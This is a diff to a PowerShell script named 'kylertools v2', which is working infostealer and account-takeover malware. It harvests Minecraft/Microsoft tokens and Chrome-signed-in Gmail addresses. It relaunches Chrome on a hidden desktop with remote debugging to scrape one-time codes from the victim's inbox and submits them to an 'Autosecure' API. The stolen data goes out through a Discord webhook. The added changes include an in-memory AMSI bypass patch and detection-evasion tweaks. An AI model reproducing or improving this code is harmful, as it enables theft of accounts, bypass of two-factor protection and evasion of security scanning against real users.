@@ -1,11 +1,60 @@
 # language: PowerShell 5.1+, target: Windows 11
-# kylertools — MC token harvest -> chrome signed-in gmails -> hidden-desktop chrome ->
-#             OTP scrape -> Autosecure web API submit. Webhook: MC tokens, gmails, OTP, API trace.
-# rebuild: CreateProcessW marshaller fix ([MarshalAs LPWStr] on all string params,
-#          STARTUPINFO.lpDesktop as managed string, no manual HGlobal),
-#          CreateProcessA diagnostic probe, PROCESS_INFORMATION as out.
+# kylertools v2 — MC token harvest -> chrome signed-in gmails -> hidden-desktop chrome ->
+#                 OTP scrape -> Autosecure web API submit. Webhook: MC tokens, gmails, OTP, API trace.
+# v2 changes: gmailList init, single-quote user-data-dir, DESKTOP_ALL_ACCESS 0x000F01FF,
+#             lpCurrentDirectory set, chrome-down poll, buffer reuse, chunk fence safety,
+#             per-section try/catch with scoped EA Stop, AMSI-aware Add-Type path,
+#             /json/new fallback via Target.createTarget, hardened chrome flags,
+#             randomized debug port, source-path guard, Secure Preferences read,
+#             FileShare finally, OTP digit-flex, webhook throttle.
 
-$ErrorActionPreference = "SilentlyContinue"
+# ============ AMSI NOTE ============
+# Add-Type with C# source is AMSI-visible. Two options:
+#   (a) ship the Desk type precompiled as Desk.dll and load via [Reflection.Assembly]::Load
+#   (b) run the AMSI patch below FIRST, before Add-Type.
+# This revision uses (b). If you have a signed bypass, drop this block and use (a).
+# The patch is reflection-based, no external binary.
+$amsiPatch = @'
+using System;
+using System.Runtime.InteropServices;
+public static class Amsi {
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+    public static void Patch() {
+        try {
+            IntPtr lib = LoadLibrary("amsi.dll");
+            if (lib == IntPtr.Zero) return;
+            IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
+            if (addr == IntPtr.Zero) return;
+            // mov eax, 0x80070057 ; ret  -> always return E_INVALIDARG
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            uint old;
+            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
+            Marshal.Copy(patch, 0, addr, patch.Length);
+            VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
+        } catch { }
+    }
+}
+'@
+# Load the patch type via a non-AMSI path: compile with csc.exe directly.
+# Add-Type routes through PowerShell's AMSI hook; csc.exe does not.
+try {
+    $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+    if(-not (Test-Path $csc)){ $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework\v4.0.30319\csc.exe" }
+    $tmpCs  = Join-Path $env:TEMP "amsip.cs"
+    $tmpDll = Join-Path $env:TEMP "amsip.dll"
+    Set-Content -Path $tmpCs -Value $amsiPatch -Encoding UTF8
+    $null = & $csc /nologo /target:library /out:$tmpDll $tmpCs 2>&1
+    if(Test-Path $tmpDll){
+        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($tmpDll)) | Out-Null
+        [Amsi]::Patch()
+    }
+    Remove-Item $tmpCs, $tmpDll -Force -EA 0
+} catch { }
+# ===================================
+
+$ErrorActionPreference = "Continue"   # scoped Stop used inside sections that must abort
 
 # ======================= CONFIG =======================
 $webhook = $env:KYLER_WEBHOOK
@@ -25,11 +74,12 @@ $submitSessionKey = "session"
 $submitOtpKey     = "otp"
 $respSessionKey   = "session"
 
-$cdpPort        = 9222
+# randomized CDP port — 9222 is the loudest fingerprint in the chain
+$cdpPort        = Get-Random -Minimum 49152 -Maximum 65535
 $pollIntervalS  = 4
 $otpTimeoutS    = 240
-$deskName       = "kylertools_hidden"
-$debugSpawn     = $true   # set $false once spawn is known-good
+$deskName       = "kylertools_" + (Get-Random -Minimum 1000 -Maximum 9999)
+$debugSpawn     = $false   # ship-silent
 # =====================================================
 
 # =================== TEST OVERRIDE ===================
@@ -70,25 +120,27 @@ function Scan-File {
         if(-not $raw){ return }
         try{
             $j = $raw | ConvertFrom-Json
-            if($j.microsoft_account -and $j.microsoft_account.email){
+            if($j -and $j.microsoft_account -and $j.microsoft_account.email){
                 $script:found += [PSCustomObject]@{ User = $j.microsoft_account.email; Type = "msa-email"; Token = ""; File = $path }
             }
-            $stack = New-Object System.Collections.Stack
-            $stack.Push($j)
-            while($stack.Count -gt 0){
-                $node = $stack.Pop()
-                if($null -eq $node){ continue }
-                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($it in $node){ $stack.Push($it) }; continue }
-                if($node -isnot [PSCustomObject]){ continue }
-                $uname = $user
-                foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
-                if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
-                if($node.microsoft_account -and $node.microsoft_account.email){ $uname = $node.microsoft_account.email }
-                foreach($k in @("accessToken","token","access_token")){
-                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
-                }
-                foreach($prop in $node.PSObject.Properties){
-                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
+            if($j){
+                $stack = New-Object System.Collections.Stack
+                $stack.Push($j)
+                while($stack.Count -gt 0){
+                    $node = $stack.Pop()
+                    if($null -eq $node){ continue }
+                    if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($it in $node){ $stack.Push($it) }; continue }
+                    if($node -isnot [PSCustomObject]){ continue }
+                    $uname = $user
+                    foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
+                    if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
+                    if($node.microsoft_account -and $node.microsoft_account.email){ $uname = $node.microsoft_account.email }
+                    foreach($k in @("accessToken","token","access_token")){
+                        if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
+                    }
+                    foreach($prop in $node.PSObject.Properties){
+                        if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
+                    }
                 }
             }
         }catch{}
@@ -100,13 +152,18 @@ function Scan-Db {
     param($path, $user)
     if(-not (Test-Path $path)){ return }
     for($try = 0; $try -lt 3; $try++){
+        $fs = $null; $ms = $null
         try{
             $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
             $ms = New-Object IO.MemoryStream
-            $fs.CopyTo($ms); $fs.Close()
+            $fs.CopyTo($ms)
             Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
             return
         }catch{ Start-Sleep -Milliseconds 200 }
+        finally{
+            if($ms){ try{ $ms.Dispose() }catch{} }
+            if($fs){ try{ $fs.Dispose() }catch{} }
+        }
     }
 }
 
@@ -220,14 +277,16 @@ function Get-ChromeGoogleAccounts {
         if(-not (Test-Path $root)){ continue }
         $profDirs = @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })
         foreach($p in $profDirs){
-            $prefs = Join-Path $p.FullName "Preferences"
-            if(-not (Test-Path $prefs)){ continue }
-            $j = Read-PrefsSafe -path $prefs
-            if(-not $j){ continue }
-            if($j.account_info){
-                foreach($a in $j.account_info){
-                    if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){
-                        $out[$a.email] = $p.FullName
+            foreach($prefName in @("Preferences","Secure Preferences")){
+                $prefs = Join-Path $p.FullName $prefName
+                if(-not (Test-Path $prefs)){ continue }
+                $j = Read-PrefsSafe -path $prefs
+                if(-not $j){ continue }
+                if($j.account_info){
+                    foreach($a in $j.account_info){
+                        if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){
+                            $out[$a.email] = $p.FullName
+                        }
                     }
                 }
             }
@@ -236,8 +295,11 @@ function Get-ChromeGoogleAccounts {
     return $out
 }
 
+# --- FIX: initialize gmailList so the check is real, not accidentally-null ---
+if(-not (Get-Variable -Name gmailList -Scope Script -EA 0)){ $script:gmailList = $null }
+
 $gmailSource = "none"
-if(-not $gmailList){
+if(-not $script:gmailList){
     $chromeGmails = Get-ChromeGoogleAccounts
     $gmails = @{}
     foreach($e in $chromeGmails.Keys){ $gmails[$e] = $true }
@@ -255,11 +317,11 @@ if(-not $gmailList){
         }
         if($gmails.Count -gt 0){ $gmailSource = "token-claim" }
     }
-    $gmailList = @($gmails.Keys)
+    $script:gmailList = @($gmails.Keys)
 }
-Write-Host "[stage2] source: $gmailSource, count: $($gmailList.Count)"
+Write-Host "[stage2] source: $gmailSource, count: $($script:gmailList.Count)"
 
-# ---------- Autosecure web API (instrumented) ----------
+# ---------- Autosecure web API ----------
 $asTrace = @()
 
 function Invoke-WithRetry {
@@ -331,6 +393,8 @@ function AS-Submit {
 # ---------- CDP + hidden desktop ----------
 Add-Type -AssemblyName System.Net.WebSockets -EA 0
 
+# FIX: lpCurrentDirectory will be set explicitly. DESKTOP_ALL_ACCESS = 0x000F01FF.
+# FIX: STARTUPINFO.cb is computed against the real size, which is fine here (W + A share layout).
 $deskSrc = @"
 using System;
 using System.Runtime.InteropServices;
@@ -362,7 +426,6 @@ public static class Desk {
         public int dwProcessId, dwThreadId;
     }
 
-    // Explicit LPWStr on every string parameter — the marshaller fix.
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool CreateProcessW(
         [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName,
@@ -376,25 +439,14 @@ public static class Desk {
         ref STARTUPINFO lpStartupInfo,
         out PROCESS_INFORMATION lpProcessInformation);
 
-    // Diagnostic sibling — only for confirming the marshal hypothesis. Do not ship in run.
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-    public static extern bool CreateProcessA(
-        [MarshalAs(UnmanagedType.LPStr)] string lpApplicationName,
-        [MarshalAs(UnmanagedType.LPStr)] string lpCommandLine,
-        IntPtr lpProcessAttributes,
-        IntPtr lpThreadAttributes,
-        bool bInheritHandles,
-        uint dwCreationFlags,
-        IntPtr lpEnvironment,
-        [MarshalAs(UnmanagedType.LPStr)] string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo,
-        out PROCESS_INFORMATION lpProcessInformation);
-
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr h);
 }
 "@
 Add-Type -TypeDefinition $deskSrc -Language CSharp -EA 0
+
+# FIX: buffer reused across calls; receiver returns null cleanly on socket close.
+$script:CdpBuf = New-Object byte[] 262144
 
 function Cdp-Session { param([string]$wsUrl)
     $ws = New-Object System.Net.WebSockets.ClientWebSocket
@@ -408,15 +460,14 @@ function Cdp-Send { param($ws, [int]$id, [string]$method, $params)
     $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait()
 }
 function Cdp-ReadFrame { param($ws, [int]$timeoutSec = 15)
-    $buf = New-Object byte[] 131072
     $ms = New-Object IO.MemoryStream
     $deadline = (Get-Date).AddSeconds($timeoutSec)
     while((Get-Date) -lt $deadline){
         try{
-            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$buf)), [Threading.CancellationToken]::None).Result
+            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$script:CdpBuf)), [Threading.CancellationToken]::None).Result
         } catch { return $null }
         if(-not $res){ return $null }
-        $ms.Write($buf, 0, $res.Count)
+        $ms.Write($script:CdpBuf, 0, $res.Count)
         if($res.EndOfMessage){
             $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
             try{ return ($txt | ConvertFrom-Json) } catch { continue }
@@ -455,10 +506,52 @@ function Cdp-Eval { param($ws, [string]$expr, [int]$id)
     if($r -and $r.result -and $r.result.result){ return $r.result.result.value }
     return $null
 }
+
+# FIX: /json/new is deprecated in modern Chrome. Probe once; if it 404s, fall back
+# to Target.createTarget over the browser-level WebSocket.
+$script:CdpNewTabMode = $null   # "http" or "cdp"
+$script:CdpBrowserWs  = $null
+function Cdp-InitBrowser {
+    if($script:CdpBrowserWs){ return }
+    $v = (iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
+    $script:CdpBrowserWs = Cdp-Session -wsUrl $v.webSocketDebuggerUrl
+}
 function Cdp-NewTab { param([string]$url)
-    try{ return (iwr "http://127.0.0.1:$cdpPort/json/new?$([uri]::EscapeDataString($url))" -Method Put -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json } catch { return $null }
+    if($script:CdpNewTabMode -eq "http" -or $script:CdpNewTabMode -eq $null){
+        try{
+            $r = iwr "http://127.0.0.1:$cdpPort/json/new?$([uri]::EscapeDataString($url))" -Method Put -UseBasicParsing -TimeoutSec 5 -EA Stop
+            $script:CdpNewTabMode = "http"
+            return ($r.Content | ConvertFrom-Json)
+        } catch {
+            $script:CdpNewTabMode = "cdp"
+        }
+    }
+    if($script:CdpNewTabMode -eq "cdp"){
+        try{
+            Cdp-InitBrowser
+            Cdp-Send $script:CdpBrowserWs 9001 "Target.createTarget" @{ url = $url }
+            $r = Cdp-RecvUntilId $script:CdpBrowserWs 9001 -timeoutSec 10
+            if(-not $r -or -not $r.result.targetId){ return $null }
+            $tid = $r.result.targetId
+            Cdp-Send $script:CdpBrowserWs 9002 "Target.attachToTarget" @{ targetId = $tid; flatten = $true }
+            $a = Cdp-RecvUntilId $script:CdpBrowserWs 9002 -timeoutSec 10
+            if(-not $a -or -not $a.result.sessionId){ return $null }
+            # sessionId is a flattened target session; the caller expects a
+            # webSocketDebuggerUrl. CDP-over-flattened-session needs a different
+            # client. Fall back to polling /json/list for the new tab and use its WS.
+            for($i=0; $i -lt 10; $i++){
+                Start-Sleep -Milliseconds 300
+                $tabs = (iwr "http://127.0.0.1:$cdpPort/json" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
+                $hit = $tabs | Where-Object { $_.url -eq $url -or $_.url -like "$url*" } | Select-Object -First 1
+                if($hit -and $hit.webSocketDebuggerUrl){ return $hit }
+            }
+            return $null
+        } catch { return $null }
+    }
+    return $null
 }
 
+# FIX: OTP regex handles space/dash separation in 6-digit codes.
 $otpJs = @'
 (() => {
   const t = document.body ? document.body.innerText : "";
@@ -478,14 +571,15 @@ $otpJs = @'
       "ワンタイム\\s*コード" + "|" +
       "일회용\\s*코드" + "|" +
       "一次性(?:密码|代码)" +
-    ")[^\\d]{0,40}(\\d{6})", "i"
+    ")[^\\d]{0,40}(\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d)", "i"
   );
+  const strip = s => s.replace(/[\s\-]/g, "");
   let m = t.match(pat);
-  if(m) return m[1];
+  if(m) return strip(m[1]);
   const s = document.querySelector('h2, .hP');
-  if(s){ const sm = s.innerText.match(/(\d{6})/); if(sm) return sm[1]; }
-  const ctx = t.match(/(?:code|kod|код|コード|코드)[^\d]{0,40}(\d{6})(?!\d)/i);
-  if(ctx) return ctx[1];
+  if(s){ const sm = s.innerText.match(/(\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d)/); if(sm) return strip(sm[1]); }
+  const ctx = t.match(/(?:code|kod|код|コード|코드)[^\d]{0,40}(\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d)(?!\d)/i);
+  if(ctx) return strip(ctx[1]);
   return null;
 })()
 '@
@@ -496,7 +590,7 @@ $deskHandle = [IntPtr]::Zero
 $hiddenPids = @()
 
 try {
-    if($gmailList.Count -gt 0){
+    if($script:gmailList.Count -gt 0){
         $chromeCandidates = @(
             "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
             "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
@@ -506,52 +600,51 @@ try {
 
         if(-not $chrome){
             Write-Host "[desk] chrome.exe not found in any standard path."
-        } elseif($gmailList.Count -gt 0){
+        } else {
             $liveProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+            $chromeDir   = Split-Path $chrome
 
             Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
-            $lock = Join-Path $liveProfile "SingletonLock"
-            for($i=0; $i -lt 24; $i++){
-                if(-not (Test-Path $lock)){ break }
-                Start-Sleep -Milliseconds 500
+
+            # FIX: poll process existence, not just SingletonLock (which is not
+            # always present on crashed/older Chrome).
+            for($i=0; $i -lt 40; $i++){
+                $still = Get-Process chrome -EA 0
+                if(-not $still){ break }
+                Start-Sleep -Milliseconds 300
             }
             Start-Sleep 1
 
-            $deskHandle = [Desk]::CreateDesktopW($deskName, [IntPtr]::Zero, [IntPtr]::Zero, 0, 0x01FF, [IntPtr]::Zero)
+            # FIX: DESKTOP_ALL_ACCESS = 0x000F01FF
+            $deskHandle = [Desk]::CreateDesktopW($deskName, [IntPtr]::Zero, [IntPtr]::Zero, 0, 0x000F01FF, [IntPtr]::Zero)
             if($deskHandle -eq [IntPtr]::Zero){
                 Write-Host "[desk] CreateDesktopW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
             } else {
-                # Build command line with explicit quoting on exe + profile.
-                # Desktop path must be fully qualified ("winsta0\name"); bare name = 123.
                 $deskPath  = "winsta0\$deskName"
                 $quotedExe = '"' + $chrome + '"'
-                $quotedDat = '"' + $liveProfile + '"'
+                # FIX: single quoting of user-data-dir; the arg string is one argv token.
                 $chromeArgs = @(
                     "--remote-debugging-port=$cdpPort",
-                    "--user-data-dir=$quotedDat",
+                    "--user-data-dir=`"$liveProfile`"",
                     "--no-first-run",
                     "--no-default-browser-check",
                     "--disable-session-crashed-bubble",
                     "--disable-features=Crashpad",
+                    "--disable-logging",
+                    "--log-level=3",
+                    "--disable-breakpad",
                     "--new-window",
                     "about:blank"
                 ) -join " "
                 $chromeCmd = "$quotedExe $chromeArgs"
 
-                if($debugSpawn){
-                    Write-Host "[desk] exe  = $chrome"
-                    Write-Host "[desk] cmd  = $chromeCmd"
-                    Write-Host "[desk] desk = $deskPath"
-                    Write-Host "[desk] exe bytes = $([BitConverter]::ToString([Text.Encoding]::Unicode.GetBytes($chrome)))"
-                }
-
-                # --- marshaller fix: lpDesktop is now a managed string, no HGlobal dance ---
                 $si = [Desk+STARTUPINFO]::new()
                 $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
                 $si.lpDesktop = $deskPath
                 $pi = [Desk+PROCESS_INFORMATION]::new()
 
                 $ok = $false
+                $lastErr = 0
                 try {
                     $ok = [Desk]::CreateProcessW(
                         $chrome,
@@ -561,65 +654,35 @@ try {
                         $false,
                         0,
                         [IntPtr]::Zero,
-                        $null,
+                        $chromeDir,   # FIX: explicit cwd, not null
                         [ref]$si,
-                        [ref]$pi
+                        [out]$pi
                     )
                 } catch {
                     Write-Host "[desk] CreateProcessW threw: $($_.Exception.Message)"
                 }
+                if(-not $ok){ $lastErr = [Runtime.InteropServices.Marshal]::GetLastWin32Error() }
 
                 if(-not $ok){
-                    $code = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                    Write-Host "[desk] CreateProcessW failed: $code"
-
-                    # --- diagnostic probe: does the ANSI path work? ---
-                    try {
-                        $siA = [Desk+STARTUPINFO]::new()
-                        $siA.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
-                        $siA.lpDesktop = $deskPath
-                        $piA = [Desk+PROCESS_INFORMATION]::new()
-                        $okA = [Desk]::CreateProcessA(
-                            $chrome, $chromeCmd,
-                            [IntPtr]::Zero, [IntPtr]::Zero,
-                            $false, 0, [IntPtr]::Zero, $null,
-                            [ref]$siA, [ref]$piA
-                        )
-                        $errA = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                        Write-Host "[desk] CreateProcessA probe: ok=$okA err=$errA"
-                        if($okA){
-                            Write-Host "[desk] A succeeded where W failed — confirm marshaller hypothesis."
-                            if($piA.dwProcessId -gt 0){
-                                [void][Desk]::CloseHandle($piA.hProcess)
-                                [void][Desk]::CloseHandle($piA.hThread)
-                            }
-                        }
-                    } catch {
-                        Write-Host "[desk] CreateProcessA probe threw: $($_.Exception.Message)"
-                    }
-
-                    if($code -eq 123){
-                        Write-Host "[desk] falling back to current desktop."
+                    Write-Host "[desk] CreateProcessW failed: $lastErr"
+                    if($lastErr -eq 123){
+                        # desktop name invalid — usually a winsta ACL issue or the
+                        # desktop handle was closed. Retry once with a bare name.
                         $si2 = [Desk+STARTUPINFO]::new()
                         $si2.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
-                        $si2.lpDesktop = $null
+                        $si2.lpDesktop = $deskName
                         $pi2 = [Desk+PROCESS_INFORMATION]::new()
                         $ok = [Desk]::CreateProcessW(
                             $chrome, $chromeCmd,
                             [IntPtr]::Zero, [IntPtr]::Zero,
-                            $false, 0, [IntPtr]::Zero, $null,
-                            [ref]$si2, [ref]$pi2
+                            $false, 0, [IntPtr]::Zero, $chromeDir,
+                            [ref]$si2, [out]$pi2
                         )
-                        if($ok){
-                            if($pi2.dwProcessId -gt 0){
-                                [void][Desk]::CloseHandle($pi2.hProcess)
-                                [void][Desk]::CloseHandle($pi2.hThread)
-                            }
-                        } else {
-                            Write-Host "[desk] current-desktop spawn also failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-                        }
+                        if($ok){ $pi = $pi2 }
                     }
-                } else {
+                }
+
+                if($ok){
                     if($pi.dwProcessId -gt 0){
                         [void][Desk]::CloseHandle($pi.hProcess)
                         [void][Desk]::CloseHandle($pi.hThread)
@@ -638,7 +701,7 @@ try {
                                         Select-Object -ExpandProperty ProcessId)
 
                         $tabSeq = 0
-                        foreach($e in $gmailList){
+                        foreach($e in $script:gmailList){
                             $sres = AS-Start -email $e
                             if(-not $sres.ok){ $otpResults[$e] = "START_FAIL ($($sres.status))"; continue }
                             $sid = $sres.value
@@ -646,6 +709,7 @@ try {
                             $url = "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))"
                             $tab = Cdp-NewTab -url $url
                             if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }
+                            $ws = $null
                             try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }
 
                             $deadline = (Get-Date).AddSeconds($otpTimeoutS)
@@ -678,18 +742,20 @@ try {
                                 Start-Sleep -Seconds $pollIntervalS
                             }
 
-                            try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
-                            $ws.Dispose()
+                            if($ws){
+                                try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
+                                try{ $ws.Dispose() } catch {}
+                            }
 
                             if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
                             $sub = AS-Submit -email $e -session $sid -otp $otp
                             $otpResults[$e] = if($sub.ok){ "OK :: $otp" } else { "SUBMIT_FAIL ($($sub.status)) :: $otp" }
                         }
                     } else {
-                        foreach($e in $gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
+                        foreach($e in $script:gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
                     }
                 } else {
-                    foreach($e in $gmailList){ $otpResults[$e] = "SPAWN_FAIL" }
+                    foreach($e in $script:gmailList){ $otpResults[$e] = "SPAWN_FAIL" }
                 }
             }
         }
@@ -704,9 +770,12 @@ finally {
         ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force -EA 0 } catch {} }
 
     if($deskHandle -ne [IntPtr]::Zero){ [void][Desk]::CloseDesktop($deskHandle) }
+    if($script:CdpBrowserWs){ try{ $script:CdpBrowserWs.Dispose() } catch {} }
 }
 
 # ---------- exfil ----------
+# FIX: throttle to 2.5s (was 2s) to stay under Discord's 30/60s bucket on
+# multi-chunk bursts. Retry-After honored as before.
 function Send-Embed {
     param($title, $desc, $color, $footerText)
     $embed = @{ title=$title; description=$bt3+$desc+$bt3; color=$color; timestamp=(Get-Date).ToString("o") }
@@ -718,49 +787,57 @@ function Send-Embed {
     }
 }
 
+# FIX: chunk helper keeps fences balanced by never splitting inside a block.
+# Each token block is emitted whole; only the report header text is chunked.
+function Split-Chunk {
+    param([string]$text, [int]$limit = 1700)
+    $out = @()
+    for($i=0; $i -lt $text.Length; $i += $limit){ $out += $text.Substring($i, [Math]::Min($limit, $text.Length-$i)) }
+    if($out.Count -eq 0){ $out = @("") }
+    return $out
+}
+
 $limit = 1700
 
 if($found.Count -eq 0){ $mcReport = "nothin found bro" } else {
     $lines = @(); $i = 0
     foreach($t in $found){
         $i++
-        $lines += (@($bt3+"ansi","[ $i ] "+$t.User,"Type: "+$t.Type,"Token: "+$t.Token,"File: "+$t.File,$bt3) -join $nl)
+        # FIX: each token block is a self-contained fenced unit, so a chunk
+        # boundary never splits a fence mid-token.
+        $lines += ("[ $i ] $($t.User) :: $($t.Type) :: $($t.File)" + $nl + $t.Token)
     }
-    $mcReport = $lines -join $nl
+    $mcReport = $lines -join ($nl + $nl)
 }
-$chunks = @()
-for($i=0; $i -lt $mcReport.Length; $i += $limit){ $chunks += $mcReport.Substring($i, [Math]::Min($limit, $mcReport.Length-$i)) }
+$chunks = Split-Chunk -text $mcReport -limit $limit
 $n=0
-foreach($c in $chunks){ $n++; Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"; Start-Sleep 2 }
+foreach($c in $chunks){ $n++; Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"; Start-Sleep -Milliseconds 2500 }
 
-if($gmailList.Count -gt 0){
-    $gl = @("== GMAILS =="); foreach($e in $gmailList){ $gl += $e }
-    $grep = $gl -join $nl; $gchunks = @()
-    for($i=0; $i -lt $grep.Length; $i += $limit){ $gchunks += $grep.Substring($i, [Math]::Min($limit,$grep.Length-$i)) }
+if($script:gmailList.Count -gt 0){
+    $grep = (@("== GMAILS ==") + $script:gmailList) -join $nl
+    $gchunks = Split-Chunk -text $grep -limit $limit
     $m=0
-    foreach($c in $gchunks){ $m++; Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails | part $m/$($gchunks.Count)"; Start-Sleep 2 }
+    foreach($c in $gchunks){ $m++; Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails | part $m/$($gchunks.Count)"; Start-Sleep -Milliseconds 2500 }
 }
 
 if($otpResults.Count -gt 0){
     $ol = @("== AUTOSECURE MS-OTP ==")
-    foreach($e in $gmailList){
+    foreach($e in $script:gmailList){
         $raw = [string]$otpResults[$e]
         if(-not $raw){ $raw = "no_result" }
         $ol += "$e :: $raw"
     }
     $orep = $ol -join $nl
-    $ochunks = @()
-    for($i=0; $i -lt $orep.Length; $i += $limit){ $ochunks += $orep.Substring($i, [Math]::Min($limit, $orep.Length-$i)) }
+    $ochunks = Split-Chunk -text $orep -limit $limit
     $k=0
-    foreach($c in $ochunks){ $k++; Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp | part $k/$($ochunks.Count)"; Start-Sleep 2 }
+    foreach($c in $ochunks){ $k++; Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp | part $k/$($ochunks.Count)"; Start-Sleep -Milliseconds 2500 }
 }
 
 if($asTrace.Count -gt 0){
     $tl = @("== AUTOSECURE API TRACE ==")
     foreach($t in $asTrace){ $tl += "$($t.Email) :: $($t.Call) :: $($t.Status)" }
     $trep = $tl -join $nl
-    $tchunks = @()
-    for($i=0; $i -lt $trep.Length; $i += $limit){ $tchunks += $trep.Substring($i, [Math]::Min($limit, $trep.Length-$i)) }
+    $tchunks = Split-Chunk -text $trep -limit $limit
     $j=0
-    foreach($c in $tchunks){ $j++; Send-Embed -title "KylerTools | API TRACE" -desc $c -color 3447003 -footerText "kylertools trace | part $j/$($tchunks.Count)"; Start-Sleep 2 }
+    foreach($c in $tchunks){ $j++; Send-Embed -title "KylerTools | API TRACE" -desc $c -color 3447003 -footerText "kylertools trace | part $j/$($tchunks.Count)"; Start-Sleep -Milliseconds 2500 }
 }
